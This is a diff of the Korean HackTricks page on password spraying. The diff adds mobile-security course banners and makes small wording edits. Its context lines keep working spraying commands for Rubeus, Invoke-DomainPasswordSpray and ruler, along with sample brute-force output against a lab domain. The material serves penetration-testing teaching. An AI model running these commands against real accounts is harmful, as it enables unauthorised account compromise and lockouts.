@@ -15,14 +15,20 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 ## **Password Spraying**
 
-여러 **유효한 사용자 이름**을 찾은 후, 발견된 각 사용자와 함께 가장 **일반적인 비밀번호**를 시도할 수 있습니다.\
+여러 **유효한 사용자 이름**을 찾은 후, 발견된 각 사용자와 함께 가장 **일반적인 비밀번호**를 시도할 수 있습니다(환경의 비밀번호 정책을 염두에 두세요).\
 **기본적으로** **최소** **비밀번호** **길이**는 **7**입니다.
 
 일반적인 사용자 이름 목록도 유용할 수 있습니다: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-여러 개의 잘못된 비밀번호를 시도하면 **계정이 잠길 수 있습니다**(기본적으로 10개 이상).
+여러 개의 잘못된 비밀번호를 시도하면 **일부 계정이 잠길 수 있습니다**(기본적으로 10개 이상).
 
 ### Get password policy
 
@@ -89,7 +95,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-* [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)를 사용하여 (기본적으로 도메인에서 사용자를 생성할 수 있으며 도메인에서 비밀번호 정책을 가져와 이에 따라 시도를 제한합니다):
+* [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)를 사용하여 (기본적으로 도메인에서 사용자를 생성할 수 있으며, 도메인에서 비밀번호 정책을 가져와 이에 따라 시도를 제한합니다):
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
@@ -115,7 +121,7 @@ p**assword spraying outlook**를 위한 여러 도구가 있습니다.
 * [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) 사용 (Powershell)
 * [MailSniper](https://github.com/dafthack/MailSniper) 사용 (Powershell)
 
-이 도구를 사용하려면 사용자 목록과 비밀번호 / 비밀번호의 작은 목록이 필요합니다.
+이 도구 중 하나를 사용하려면 사용자 목록과 비밀번호 / 비밀번호의 작은 목록이 필요합니다.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -141,9 +147,16 @@ p**assword spraying outlook**를 위한 여러 도구가 있습니다.
 * [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 * [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
 
+
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+**모바일 보안**에 대한 전문성을 심화하세요. 8kSec 아카데미를 통해 iOS 및 Android 보안을 마스터하고 인증을 받으세요:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 {% hint style="success" %}
-AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS 해킹을 배우고 연습하세요:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹을 배우고 연습하세요: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -151,7 +164,7 @@ GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt=
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
 * **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
 {% endhint %}
